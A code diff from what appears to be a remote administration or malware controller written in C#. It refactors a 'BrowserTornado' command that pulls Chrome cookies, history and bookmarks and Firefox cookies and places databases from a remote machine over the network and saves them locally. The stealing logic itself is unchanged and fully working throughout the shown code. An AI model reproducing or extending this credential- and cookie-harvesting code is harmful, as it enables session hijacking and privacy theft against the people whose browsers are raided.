@@ -1,7 +1,6 @@
 ﻿using Master.AdvancedConsole;
 using Master.Commands.Core;
 using Master.Core;
-using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -50,23 +49,23 @@ namespace Master.Commands.BrowserTornado
 
         void GetDatabases(Databases databases)
         {
-            var masterNetworkManager = (MasterNetworkManager)MasterCommandsManager.networkManager;
+            var networkManager = MasterNetworkManager.GetInstance();
             // Don't show file transfer progress
-            masterNetworkManager.UnsetStreamTransfertEventHandlers();
+            networkManager.UnsetStreamTransfertEventHandlers();
 
             ColorTools.WriteCommandMessage("Starting browsers databases harvest...");
             Directory.CreateDirectory("temp-bt");
 
             #region Chrome
-            if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+            if (networkManager.ReadLine() == "OK")
             {
                 ColorTools.WriteCommandSuccess("Google Chrome was found");
 
-                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+                if (networkManager.ReadLine() == "OK")
                 {
                     using (var readStream = new FileStream("temp-bt/gc-cookies", FileMode.Create))
                     {
-                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
+                        networkManager.NetworkStreamToStream(readStream);
                         databases.chromecookies = "temp-bt/gc-cookies";
                     }
                     ColorTools.WriteCommandMessage("Cookies database downloaded");
@@ -76,11 +75,11 @@ namespace Master.Commands.BrowserTornado
                     ColorTools.WriteCommandError("Couldn't retrieve cookies database");
                 }
 
-                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+                if (networkManager.ReadLine() == "OK")
                 {
                     using (var readStream = new FileStream("temp-bt/gc-history", FileMode.Create))
                     {
-                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
+                        networkManager.NetworkStreamToStream(readStream);
                         databases.chromehistory = "temp-bt/gc-history";
                     }
                     ColorTools.WriteCommandMessage("History database downloaded");
@@ -90,11 +89,11 @@ namespace Master.Commands.BrowserTornado
                     ColorTools.WriteCommandError("Couldn't retrieve history database");
                 }
 
-                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+                if (networkManager.ReadLine() == "OK")
                 {
                     using (var readStream = new FileStream("temp-bt/gc-bookmarks", FileMode.Create))
                     {
-                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
+                        networkManager.NetworkStreamToStream(readStream);
                         databases.chromebookmarks = "temp-bt/gc-bookmarks";
                     }
                     ColorTools.WriteCommandMessage("Bookmarks database downloaded");
@@ -111,15 +110,15 @@ namespace Master.Commands.BrowserTornado
             #endregion Chrome
 
             #region Firefox
-            if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+            if (networkManager.ReadLine() == "OK")
             {
                 ColorTools.WriteCommandSuccess("Firefox was found");
 
-                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+                if (networkManager.ReadLine() == "OK")
                 {
                     using (var readStream = new FileStream("temp-bt/ff-cookies", FileMode.Create))
                     {
-                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
+                        networkManager.NetworkStreamToStream(readStream);
                         databases.ffcookies = "temp-bt/ff-cookies";
                     }
                     ColorTools.WriteCommandMessage("Cookies database downloaded");
@@ -129,11 +128,11 @@ namespace Master.Commands.BrowserTornado
                     ColorTools.WriteCommandError("Couldn't retrieve cookies database");
                 }
 
-                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
+                if (networkManager.ReadLine() == "OK")
                 {
                     using (var readStream = new FileStream("temp-bt/ff-places", FileMode.Create))
                     {
-                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
+                        networkManager.NetworkStreamToStream(readStream);
                         databases.ffplaces = "temp-bt/ff-places";
                     }
                     ColorTools.WriteCommandMessage("Places database downloaded");
@@ -149,7 +148,7 @@ namespace Master.Commands.BrowserTornado
             }
             #endregion Firefox
 
-            masterNetworkManager.SetStreamTransfertEventHandlers();
+            networkManager.SetStreamTransfertEventHandlers();
         }
 
         string ProcessDatabases(Databases databases)
